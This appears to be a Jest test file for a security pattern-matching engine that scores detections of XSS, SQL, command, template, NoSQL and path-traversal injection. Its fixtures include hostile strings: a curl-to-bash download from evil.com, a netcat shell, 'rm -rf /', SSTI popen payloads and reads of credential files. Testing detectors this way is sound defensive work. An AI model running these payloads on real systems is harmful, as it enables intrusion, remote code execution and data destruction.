/**
 * Real-Time Pattern Matcher Tests
 *
 * Comprehensive test suite for the real-time pattern matching system
 * with confidence scoring validation and performance benchmarking.
 *
 * @fileoverview Pattern Matcher Test Suite
 * @version 1.0.0
 * @author Security Testing Specialist
 */

import {
  RealTimePatternMatcher,
  PatternRegistry,
  StreamingPatternProcessor,
  createRealTimePatternMatcher,
  createStreamingProcessor,
  type PatternMatchConfig,
  type PatternMatchResult,
  type BatchMatchResult,
  type PatternType,
} from "../real-time-pattern-matcher";

describe("RealTimePatternMatcher", () => {
  let matcher: RealTimePatternMatcher;

  beforeEach(() => {
    matcher = createRealTimePatternMatcher({
      enableParallelProcessing: true,
      maxWorkers: 2,
      defaultProcessingMode: "async",
      confidenceAlgorithm: "weighted_average",
      maxProcessingTime: 500,
      enableCaching: true,
      cacheConfig: {
        maxSize: 100,
        ttl: 60000,
        algorithm: "lru",
        persistToDisk: false,
        compressionEnabled: false,
      },
      streamingConfig: {
        chunkSize: 1024,
        maxConcurrency: 4,
        backpressureThreshold: 100,
        bufferSize: 10240,
        enableMetrics: true,
      },
      enableMetrics: true,
      metricsInterval: 1000,
      alertThresholds: {
        highLatency: 1000,
        lowThroughput: 1,
        highErrorRate: 10,
      },
      confidenceConfig: {
        enabled: true,
        sourceWeights: {
          pattern_matcher: 0.9,
          vulnerability_detector: 0.85,
          owasp_scanner: 0.95,
          configuration_analyzer: 0.8,
          default: 0.75,
        },
        bounds: {
          minimum: 0.1,
          maximum: 0.95,
        },
      },
    });
  });

  afterEach(async () => {
    await matcher.shutdown();
  });

  describe("System Initialization", () => {
    it("should initialize with default patterns", () => {
      const stats = matcher.getPatternStats();
      expect(stats.totalPatterns).toBeGreaterThan(0);
      expect(stats.patternsByType).toBeDefined();
      expect(stats.averageConfidence).toBeGreaterThan(0);
    });

    it("should emit system_initialized event", (done) => {
      const newMatcher = createRealTimePatternMatcher();

      newMatcher.on("system_initialized", (data) => {
        expect(data.patterns).toBeGreaterThan(0);
        expect(data.workers).toBeGreaterThanOrEqual(0);
        expect(data.cacheSize).toBeGreaterThan(0);
        newMatcher.shutdown().then(() => done());
      });
    });

    it("should handle configuration properly", () => {
      const customConfig = {
        enableParallelProcessing: false,
        maxWorkers: 1,
        enableCaching: false,
      };

      const customMatcher = createRealTimePatternMatcher(customConfig);
      expect(customMatcher).toBeDefined();
      customMatcher.shutdown();
    });
  });

  describe("Pattern Registration", () => {
    it("should allow custom pattern registration", () => {
      const customPattern: PatternMatchConfig = {
        pattern: /test-pattern-\d+/gi,
        type: "custom",
        name: "test_custom_pattern",
        description: "Test custom pattern",
        baseSeverity: "medium",
        baseConfidence: 0.8,
        weight: 1.0,
        maxExecutionTime: 100,
        cacheResults: true,
        enableParallel: true,
      };

      matcher.registerPattern(customPattern);
      const stats = matcher.getPatternStats();
      expect(stats.patternsByType.custom).toBe(1);
    });

    it("should emit pattern_registered event", (done) => {
      const customPattern: PatternMatchConfig = {
        pattern: /event-test-\d+/gi,
        type: "custom",
        name: "event_test_pattern",
        description: "Event test pattern",
        baseSeverity: "low",
        baseConfidence: 0.7,
        weight: 1.0,
        maxExecutionTime: 50,
        cacheResults: true,
        enableParallel: true,
      };

      matcher.on("pattern_registered", (data) => {
        expect(data.name).toBe("event_test_pattern");
        expect(data.type).toBe("custom");
        done();
      });

      matcher.registerPattern(customPattern);
    });
  });

  describe("XSS Pattern Detection", () => {
    it("should detect basic script tag XSS", async () => {
      const maliciousInput = '<script>alert("XSS")</script>';
      const results = await matcher.matchPatterns(maliciousInput);

      expect(results).toBeDefined();
      expect(results.length).toBeGreaterThan(0);

      const xssResult = results.find((r) => r.patternType === "xss");
      expect(xssResult).toBeDefined();
      expect(xssResult!.matched).toBe(true);
      expect(xssResult!.matches.length).toBeGreaterThan(0);
      expect(xssResult!.confidence.score).toBeGreaterThan(0.5);
      expect(xssResult!.severity).toBe("high");
    });

    it("should detect JavaScript protocol XSS", async () => {
      const maliciousInput = 'javascript:alert("XSS")';
      const results = await matcher.matchPatterns(maliciousInput);

      const xssResult = results.find(
        (r) =>
          r.patternType === "xss" && r.patternName === "javascript_protocol",
      );

      expect(xssResult).toBeDefined();
      expect(xssResult!.matched).toBe(true);
      expect(xssResult!.confidence.score).toBeGreaterThan(0.7);
    });

    it("should not trigger false positives on safe input", async () => {
      const safeInput = "This is a normal text with <p>HTML</p> tags";
      const results = await matcher.matchPatterns(safeInput, [
        "basic_script_tag",
      ]);

      expect(results.length).toBe(0);
    });
  });

  describe("SQL Injection Detection", () => {
    it("should detect SQL keyword injection", async () => {
      const maliciousInput = "SELECT * FROM users WHERE id = 1";
      const results = await matcher.matchPatterns(maliciousInput);

      const sqlResult = results.find((r) => r.patternType === "sql_injection");
      expect(sqlResult).toBeDefined();
      expect(sqlResult!.matched).toBe(true);
      expect(sqlResult!.severity).toBe("critical");
      expect(sqlResult!.riskScore).toBeGreaterThan(50);
    });

    it("should detect boolean blind SQL injection", async () => {
      const maliciousInput = "1 AND 1=1";
      const results = await matcher.matchPatterns(maliciousInput);

      const sqlResult = results.find(
        (r) =>
          r.patternType === "sql_injection" &&
          r.patternName === "sql_boolean_blind",
      );

      expect(sqlResult).toBeDefined();
      expect(sqlResult!.matched).toBe(true);
      expect(sqlResult!.confidence.score).toBeGreaterThan(0.5);
    });

    it("should handle complex SQL injection attempts", async () => {
      const maliciousInput = "'; DROP TABLE users; --";
      const results = await matcher.matchPatterns(maliciousInput);

      expect(results.length).toBeGreaterThan(0);
      expect(results.some((r) => r.patternType === "sql_injection")).toBe(true);
    });
  });

  describe("Command Injection Detection", () => {
    it("should detect command separator injection", async () => {
      const maliciousInput = "test; cat /etc/passwd";
      const results = await matcher.matchPatterns(maliciousInput);

      const cmdResult = results.find(
        (r) => r.patternType === "command_injection",
      );
      expect(cmdResult).toBeDefined();
      expect(cmdResult!.matched).toBe(true);
      expect(cmdResult!.severity).toBe("critical");
      expect(cmdResult!.riskScore).toBeGreaterThan(70);
    });

    it("should detect various command injection patterns", async () => {
      const testCases = [
        "test | ls -la",
        "input && rm -rf /",
        "data `whoami`",
        "file & wget malicious.com/script.sh",
      ];

      for (const testCase of testCases) {
        const results = await matcher.matchPatterns(testCase);
        const cmdResult = results.find(
          (r) => r.patternType === "command_injection",
        );
        expect(cmdResult).toBeDefined();
        expect(cmdResult!.matched).toBe(true);
      }
    });
  });

  describe("Path Traversal Detection", () => {
    it("should detect directory traversal attacks", async () => {
      const maliciousInput = "../../etc/passwd";
      const results = await matcher.matchPatterns(maliciousInput);

      const pathResult = results.find(
        (r) => r.patternType === "path_traversal",
      );
      expect(pathResult).toBeDefined();
      expect(pathResult!.matched).toBe(true);
      expect(pathResult!.severity).toBe("medium");
    });

    it("should detect Windows path traversal", async () => {
      const maliciousInput = "..\\..\\windows\\system32\\config\\sam";
      const results = await matcher.matchPatterns(maliciousInput);

      const pathResult = results.find(
        (r) => r.patternType === "path_traversal",
      );
      expect(pathResult).toBeDefined();
      expect(pathResult!.matched).toBe(true);
    });
  });

  describe("Template Injection Detection", () => {
    it("should detect server-side template injection", async () => {
      const maliciousInput = "{{config.items()}}";
      const results = await matcher.matchPatterns(maliciousInput);

      const templateResult = results.find(
        (r) => r.patternType === "template_injection",
      );
      expect(templateResult).toBeDefined();
      expect(templateResult!.matched).toBe(true);
      expect(templateResult!.severity).toBe("high");
    });

    it("should detect various template injection patterns", async () => {
      const testCases = [
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{session.get('secret_key')}}",
      ];

      for (const testCase of testCases) {
        const results = await matcher.matchPatterns(testCase);
        const templateResult = results.find(
          (r) => r.patternType === "template_injection",
        );
        expect(templateResult).toBeDefined();
        expect(templateResult!.matched).toBe(true);
      }
    });
  });

  describe("NoSQL Injection Detection", () => {
    it("should detect NoSQL operator injection", async () => {
      const maliciousInput = '{"$where": "this.credits == this.debits"}';
      const results = await matcher.matchPatterns(maliciousInput);

      const nosqlResult = results.find(
        (r) => r.patternType === "nosql_injection",
      );
      expect(nosqlResult).toBeDefined();
      expect(nosqlResult!.matched).toBe(true);
      expect(nosqlResult!.severity).toBe("high");
    });

    it("should detect MongoDB injection patterns", async () => {
      const testCases = [
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
      ];

      for (const testCase of testCases) {
        const results = await matcher.matchPatterns(testCase);
        const nosqlResult = results.find(
          (r) => r.patternType === "nosql_injection",
        );
        expect(nosqlResult).toBeDefined();
        expect(nosqlResult!.matched).toBe(true);
      }
    });
  });

  describe("Confidence Scoring", () => {
    it("should provide accurate confidence scores", async () => {
      const testInput = '<script>alert("high confidence XSS")</script>';
      const results = await matcher.matchPatterns(testInput);

      const xssResult = results.find((r) => r.patternType === "xss");
      expect(xssResult).toBeDefined();
      expect(xssResult!.confidence.score).toBeGreaterThan(0.7);
      expect(xssResult!.confidence.score).toBeLessThanOrEqual(1.0);
      expect(xssResult!.confidence.source).toBe("pattern_matcher");
      expect(xssResult!.confidence.timestamp).toBeInstanceOf(Date);
    });

    it("should adjust confidence based on pattern characteristics", async () => {
      // High confidence pattern
      const highConfidenceInput = "'; DROP TABLE users; --";
      const highResults = await matcher.matchPatterns(highConfidenceInput);

      // Lower confidence pattern
      const lowConfidenceInput = "test AND 1=1";
      const lowResults = await matcher.matchPatterns(lowConfidenceInput);

      const highConfResult = highResults.find(
        (r) => r.patternType === "sql_injection",
      );
      const lowConfResult = lowResults.find(
        (r) => r.patternType === "sql_injection",
      );

      if (highConfResult && lowConfResult) {
        // Note: This comparison depends on pattern weights and may need adjustment
        expect(highConfResult.confidence.score).toBeGreaterThan(0.5);
        expect(lowConfResult.confidence.score).toBeGreaterThan(0.5);
      }
    });
  });

  describe("Risk Score Calculation", () => {
    it("should calculate appropriate risk scores", async () => {
      const testCases = [
        {
          input: '<script>alert("XSS")</script>',
          expectedMin: 50,
          type: "xss",
        },
        {
          input: "SELECT * FROM users",
          expectedMin: 60,
          type: "sql_injection",
        },
        { input: "test; rm -rf /", expectedMin: 70, type: "command_injection" },
        { input: "../../etc/passwd", expectedMin: 30, type: "path_traversal" },
      ];

      for (const testCase of testCases) {
        const results = await matcher.matchPatterns(testCase.input);
        const result = results.find((r) => r.patternType === testCase.type);

        expect(result).toBeDefined();
        expect(result!.riskScore).toBeGreaterThanOrEqual(testCase.expectedMin);
        expect(result!.riskScore).toBeLessThanOrEqual(100);
      }
    });

    it("should adjust risk scores based on match count", async () => {
      const singleMatchInput = '<script>alert("XSS")</script>';
      const multipleMatchInput =
        '<script>alert("XSS1")</script><script>alert("XSS2")</script>';

      const singleResults = await matcher.matchPatterns(singleMatchInput);
      const multipleResults = await matcher.matchPatterns(multipleMatchInput);

      const singleResult = singleResults.find((r) => r.patternType === "xss");
      const multipleResult = multipleResults.find(
        (r) => r.patternType === "xss",
      );

      expect(singleResult).toBeDefined();
      expect(multipleResult).toBeDefined();

      // Multiple matches should generally result in higher risk
      if (multipleResult!.matches.length > singleResult!.matches.length) {
        expect(multipleResult!.riskScore).toBeGreaterThanOrEqual(
          singleResult!.riskScore,
        );
      }
    });
  });

  describe("Caching System", () => {
    it("should cache results for repeated inputs", async () => {
      const testInput = '<script>alert("cache test")</script>';

      // First request - should miss cache
      const firstResults = await matcher.matchPatterns(testInput);
      expect(firstResults.length).toBeGreaterThan(0);

      // Second request - should hit cache
      const secondResults = await matcher.matchPatterns(testInput);
      expect(secondResults.length).toBeGreaterThan(0);

      // Results should be similar (cache hit)
      expect(firstResults[0].patternType).toBe(secondResults[0].patternType);
      expect(firstResults[0].matched).toBe(secondResults[0].matched);
    });

    it("should handle cache clearing", async () => {
      const testInput = '<script>alert("clear test")</script>';

      await matcher.matchPatterns(testInput);
      matcher.clearCache();

      const metrics = matcher.getMetrics();
      expect(metrics).toBeDefined();
    });

    it("should emit cache events", (done) => {
      const testInput = '<script>alert("event test")</script>';
      let cacheHitReceived = false;
      let cacheCleared = false;

      matcher.on("cache_hit", () => {
        cacheHitReceived = true;
        checkComplete();
      });

      matcher.on("cache_cleared", () => {
        cacheCleared = true;
        checkComplete();
      });

      function checkComplete() {
        if (cacheHitReceived && cacheCleared) {
          done();
        }
      }

      // First call to populate cache
      matcher.matchPatterns(testInput).then(() => {
        // Second call should hit cache
        matcher.matchPatterns(testInput).then(() => {
          matcher.clearCache();
        });
      });
    });
  });

  describe("Batch Processing", () => {
    it("should process multiple inputs in batch", async () => {
      const inputs = [
        '<script>alert("XSS1")</script>',
        "SELECT * FROM users",
        "test; cat /etc/passwd",
        "../../etc/passwd",
        "normal safe text",
      ];

      const batchResult = await matcher.processBatch(inputs);

      expect(batchResult.batchId).toBeDefined();
      expect(batchResult.results.length).toBeGreaterThan(0);
      expect(batchResult.summary.totalProcessed).toBe(inputs.length);
      expect(batchResult.summary.totalMatches).toBeGreaterThan(0);
      expect(batchResult.performance.totalTime).toBeGreaterThan(0);
      expect(batchResult.performance.throughput).toBeGreaterThan(0);
    });

    it("should emit batch events", (done) => {
      const inputs = [
        '<script>alert("batch1")</script>',
        '<script>alert("batch2")</script>',
      ];

      let progressReceived = false;
      let completedReceived = false;

      matcher.on("batch_progress", (data) => {
        expect(data.batchId).toBeDefined();
        expect(data.processed).toBeGreaterThan(0);
        expect(data.total).toBe(inputs.length);
        progressReceived = true;
        checkComplete();
      });

      matcher.on("batch_completed", (data) => {
        expect(data.batchId).toBeDefined();
        expect(data.totalProcessed).toBe(inputs.length);
        expect(data.totalTime).toBeGreaterThan(0);
        completedReceived = true;
        checkComplete();
      });

      function checkComplete() {
        if (progressReceived && completedReceived) {
          done();
        }
      }

      matcher.processBatch(inputs);
    });

    it("should handle batch processing errors gracefully", async () => {
      const inputs = ["normal input"]; // Safe input

      try {
        const result = await matcher.processBatch(inputs);
        expect(result).toBeDefined();
        expect(result.summary.totalProcessed).toBe(inputs.length);
      } catch (error) {
        // Should not throw for normal inputs
        fail("Batch processing should not fail for safe inputs");
      }
    });
  });

  describe("Performance Metrics", () => {
    it("should track performance metrics", async () => {
      await matcher.matchPatterns('<script>alert("metrics")</script>');
      await matcher.matchPatterns("SELECT * FROM users");

      const metrics = matcher.getMetrics();

      expect(metrics.totalMatches).toBeGreaterThanOrEqual(0);
      expect(metrics.averageProcessingTime).toBeGreaterThanOrEqual(0);
      expect(metrics.throughput).toBeGreaterThanOrEqual(0);
      expect(metrics.cacheHitRate).toBeGreaterThanOrEqual(0);
      expect(metrics.errorRate).toBeGreaterThanOrEqual(0);
      expect(metrics.memoryUsage).toBeDefined();
    });

    it("should emit metrics updates", (done) => {
      let metricsReceived = false;

      matcher.on("metrics_updated", (metrics) => {
        expect(metrics.totalMatches).toBeGreaterThanOrEqual(0);
        expect(metrics.throughput).toBeGreaterThanOrEqual(0);
        expect(metrics.cacheHitRate).toBeGreaterThanOrEqual(0);
        metricsReceived = true;

        if (metricsReceived) {
          done();
        }
      });

      // Trigger some processing to generate metrics
      matcher.matchPatterns('<script>alert("metrics")</script>');
    });
  });

  describe("Error Handling", () => {
    it("should handle invalid pattern names gracefully", async () => {
      const results = await matcher.matchPatterns("test input", [
        "non_existent_pattern",
      ]);

      expect(results).toBeDefined();
      expect(Array.isArray(results)).toBe(true);
    });

    it("should emit error events for pattern failures", (done) => {
      // Register a pattern that might cause issues
      const problematicPattern: PatternMatchConfig = {
        pattern: "invalid-regex-[", // Invalid regex
        type: "custom",
        name: "problematic_pattern",
        description: "Pattern that causes errors",
        baseSeverity: "low",
        baseConfidence: 0.5,
        weight: 1.0,
        maxExecutionTime: 100,
        cacheResults: false,
        enableParallel: false,
      };

      matcher.registerPattern(problematicPattern);

      matcher.on("pattern_error", (data) => {
        expect(data.patternName).toBe("problematic_pattern");
        expect(data.error).toBeDefined();
        done();
      });

      matcher.matchPatterns("test input", ["problematic_pattern"]);
    });
  });

  describe("Context-Aware Processing", () => {
    it("should include context in results", async () => {
      const context = {
        requestId: "test-123",
        userId: "user-456",
        endpoint: "/api/test",
      };

      const results = await matcher.matchPatterns(
        '<script>alert("context")</script>',
        undefined,
        context,
      );

      const result = results[0];
      expect(result).toBeDefined();
      expect(result.context).toEqual(context);
      expect(result.metadata.timestamp).toBeInstanceOf(Date);
      expect(result.metadata.version).toBeDefined();
    });

    it("should use context in confidence scoring", async () => {
      const highRiskContext = {
        environment: "production",
        authenticated: false,
        publicEndpoint: true,
      };

      const lowRiskContext = {
        environment: "development",
        authenticated: true,
        publicEndpoint: false,
      };

      const testInput = '<script>alert("context scoring")</script>';

      const highRiskResults = await matcher.matchPatterns(
        testInput,
        undefined,
        highRiskContext,
      );

      const lowRiskResults = await matcher.matchPatterns(
        testInput,
        undefined,
        lowRiskContext,
      );

      expect(highRiskResults.length).toBeGreaterThan(0);
      expect(lowRiskResults.length).toBeGreaterThan(0);

      // Both should detect the threat, context affects confidence
      expect(highRiskResults[0].confidence.score).toBeGreaterThan(0.5);
      expect(lowRiskResults[0].confidence.score).toBeGreaterThan(0.5);
    });
  });

  describe("Alert System", () => {
    it("should emit alerts for threshold violations", (done) => {
      // Configure with very low thresholds to trigger alerts
      const alertMatcher = createRealTimePatternMatcher({
        alertThresholds: {
          highLatency: 0.1, // Very low threshold
          lowThroughput: 1000, // Very high threshold
          highErrorRate: 0.1, // Very low threshold
        },
        metricsInterval: 100, // Fast metrics updates
      });

      let alertReceived = false;

      alertMatcher.on("alert", (alert) => {
        expect(alert.type).toBeDefined();
        expect(alert.value).toBeDefined();
        expect(alert.threshold).toBeDefined();
        alertReceived = true;

        if (alertReceived) {
          alertMatcher.shutdown().then(() => done());
        }
      });

      // Process some patterns to trigger metrics
      alertMatcher.matchPatterns('<script>alert("alert test")</script>');
    });
  });
});

describe("PatternRegistry", () => {
  let registry: PatternRegistry;

  beforeEach(() => {
    registry = new PatternRegistry();
  });

  describe("Pattern Management", () => {
    it("should register and retrieve patterns", () => {
      const pattern: PatternMatchConfig = {
        pattern: /test-\d+/gi,
        type: "custom",
        name: "test_pattern",
        description: "Test pattern",
        baseSeverity: "low",
        baseConfidence: 0.6,
        weight: 1.0,
        maxExecutionTime: 100,
        cacheResults: true,
        enableParallel: true,
      };

      registry.registerPattern(pattern);

      const retrieved = registry.getPattern("test_pattern");
      expect(retrieved).toEqual(pattern);

      const compiled = registry.getCompiledPattern("test_pattern");
      expect(compiled).toBeInstanceOf(RegExp);
    });

    it("should organize patterns by type", () => {
      const xssPattern: PatternMatchConfig = {
        pattern: /<script>/gi,
        type: "xss",
        name: "xss_test",
        description: "XSS test",
        baseSeverity: "high",
        baseConfidence: 0.8,
        weight: 1.0,
        maxExecutionTime: 100,
        cacheResults: true,
        enableParallel: true,
      };

      const sqlPattern: PatternMatchConfig = {
        pattern: /SELECT.*FROM/gi,
        type: "sql_injection",
        name: "sql_test",
        description: "SQL test",
        baseSeverity: "critical",
        baseConfidence: 0.9,
        weight: 1.0,
        maxExecutionTime: 100,
        cacheResults: true,
        enableParallel: true,
      };

      registry.registerPattern(xssPattern);
      registry.registerPattern(sqlPattern);

      const xssPatterns = registry.getPatternsByType("xss");
      const sqlPatterns = registry.getPatternsByType("sql_injection");

      expect(xssPatterns.length).toBe(1);
      expect(sqlPatterns.length).toBe(1);
      expect(xssPatterns[0].name).toBe("xss_test");
      expect(sqlPatterns[0].name).toBe("sql_test");
    });

    it("should remove patterns correctly", () => {
      const pattern: PatternMatchConfig = {
        pattern: /remove-test/gi,
        type: "custom",
        name: "remove_test",
        description: "Remove test",
        baseSeverity: "low",
        baseConfidence: 0.5,
        weight: 1.0,
        maxExecutionTime: 100,
        cacheResults: true,
        enableParallel: true,
      };

      registry.registerPattern(pattern);
      expect(registry.getPattern("remove_test")).toBeDefined();

      const removed = registry.removePattern("remove_test");
      expect(removed).toBe(true);
      expect(registry.getPattern("remove_test")).toBeUndefined();
    });

    it("should initialize default patterns", () => {
      registry.initializeDefaultPatterns();

      const patterns = registry.getAllPatternNames();
      expect(patterns.length).toBeGreaterThan(0);

      // Check for expected default patterns
      expect(patterns).toContain("basic_script_tag");
      expect(patterns).toContain("javascript_protocol");
      expect(patterns).toContain("sql_keywords");
      expect(patterns).toContain("command_separators");
    });
  });
});

describe("StreamingPatternProcessor", () => {
  let matcher: RealTimePatternMatcher;
  let processor: StreamingPatternProcessor;

  beforeEach(() => {
    matcher = createRealTimePatternMatcher({
      enableCaching: false, // Disable caching for streaming tests
    });

    processor = createStreamingProcessor(matcher, {
      chunkSize: 100,
      maxConcurrency: 2,
      backpressureThreshold: 200,
      bufferSize: 1000,
      enableMetrics: true,
    });
  });

  afterEach(async () => {
    await matcher.shutdown();
  });

  describe("Chunk Processing", () => {
    it("should process data chunks", async () => {
      const testData = Buffer.from('<script>alert("streaming")</script>');

      let matchesFound = false;
      processor.on("matches_found", (data) => {
        expect(data.dataSize).toBeGreaterThan(0);
        expect(data.matches).toBeGreaterThan(0);
        expect(data.results).toBeDefined();
        matchesFound = true;
      });

      await processor.processChunk(testData);

      // Give some time for async processing
      await new Promise((resolve) => setTimeout(resolve, 100));

      expect(matchesFound).toBe(true);
    });

    it("should handle backpressure", async () => {
      const largeData = Buffer.alloc(300, "x"); // Larger than backpressure threshold

      let backpressureDetected = false;
      processor.on("backpressure", (data) => {
        expect(data.bufferSize).toBeGreaterThan(0);
        expect(data.threshold).toBeDefined();
        backpressureDetected = true;
      });

      await processor.processChunk(largeData);

      // Multiple chunks to trigger backpressure
      await processor.processChunk(largeData);
      await processor.processChunk(largeData);

      // Give time for processing
      await new Promise((resolve) => setTimeout(resolve, 200));

      expect(backpressureDetected).toBe(true);
    });
  });
});

describe("Performance Benchmarks", () => {
  let matcher: RealTimePatternMatcher;

  beforeEach(() => {
    matcher = createRealTimePatternMatcher({
      enableCaching: true,
      enableParallelProcessing: true,
    });
  });

  afterEach(async () => {
    await matcher.shutdown();
  });

  it("should process patterns within performance targets", async () => {
    const testInput =
      '<script>alert("performance")</script>SELECT * FROM users';
    const startTime = Date.now();

    const results = await matcher.matchPatterns(testInput);

    const processingTime = Date.now() - startTime;

    expect(results.length).toBeGreaterThan(0);
    expect(processingTime).toBeLessThan(1000); // Should complete within 1 second

    // Check individual pattern processing times
    for (const result of results) {
      expect(result.processingTime).toBeLessThan(500); // Individual patterns should be fast
    }
  });

  it("should maintain performance under load", async () => {
    const inputs = Array(100).fill('<script>alert("load test")</script>');
    const startTime = Date.now();

    const batchResult = await matcher.processBatch(inputs);

    const totalTime = Date.now() - startTime;
    const throughput = inputs.length / (totalTime / 1000);

    expect(batchResult.summary.totalProcessed).toBe(inputs.length);
    expect(throughput).toBeGreaterThan(10); // Should process at least 10 items per second
    expect(batchResult.performance.throughput).toBeGreaterThan(10);
  });

  it("should demonstrate caching performance benefits", async () => {
    const testInput = '<script>alert("cache performance")</script>';

    // First run - no cache
    const startTime1 = Date.now();
    await matcher.matchPatterns(testInput);
    const firstRunTime = Date.now() - startTime1;

    // Second run - with cache
    const startTime2 = Date.now();
    await matcher.matchPatterns(testInput);
    const secondRunTime = Date.now() - startTime2;

    // Cache should provide performance benefit (though this may not always be true for fast patterns)
    expect(secondRunTime).toBeLessThanOrEqual(firstRunTime * 2); // Allow some variance

    const metrics = matcher.getMetrics();
    expect(metrics.cacheHitRate).toBeGreaterThan(0);
  });
});

describe("Integration Tests", () => {
  it("should integrate with existing confidence scoring system", async () => {
    const matcher = createRealTimePatternMatcher();

    const results = await matcher.matchPatterns(
      '<script>alert("integration")</script>',
    );
    const result = results[0];

    expect(result).toBeDefined();
    expect(result.confidence).toBeDefined();
    expect(result.confidence.score).toBeGreaterThan(0);
    expect(result.confidence.source).toBe("pattern_matcher");
    expect(result.confidence.sourceWeight).toBeGreaterThan(0);
    expect(result.confidence.timestamp).toBeInstanceOf(Date);

    await matcher.shutdown();
  });

  it("should work with various input types and encodings", async () => {
    const matcher = createRealTimePatternMatcher();

    const testCases = [
      '<script>alert("ASCII")</script>',
      '<script>alert("UTF-8: 你好")</script>',
      "%3Cscript%3Ealert%28%22URL%20encoded%22%29%3C%2Fscript%3E",
      "\\x3cscript\\x3ealert(\\x22hex encoded\\x22)\\x3c/script\\x3e",
    ];

    for (const testCase of testCases) {
      const results = await matcher.matchPatterns(testCase);
      expect(results).toBeDefined();
      expect(Array.isArray(results)).toBe(true);
    }

    await matcher.shutdown();
  });

  it("should handle real-world attack patterns", async () => {
    const matcher = createRealTimePatternMatcher();

    const realWorldAttacks = [
      // XSS variants
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",

      // SQL injection variants
      "1' OR '1'='1'-- ",
      "1; DROP TABLE users; --",
      "1' UNION SELECT null,user(),version()-- ",

      // Command injection variants
      "| nc -l -p 1234 -e /bin/bash",
      "&& curl http://evil.com/malware.sh | bash",
      "`whoami > /tmp/pwned.txt`",

      // Path traversal variants
      "....//....//....//etc/passwd",
      "..%252f..%252f..%252fetc%252fpasswd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    ];

    for (const attack of realWorldAttacks) {
      const results = await matcher.matchPatterns(attack);

      // Should detect at least one threat pattern
      expect(results.length).toBeGreaterThan(0);

      // At least one result should be high confidence
      const highConfResult = results.find((r) => r.confidence.score > 0.6);
      expect(highConfResult).toBeDefined();
    }

    await matcher.shutdown();
  });
});
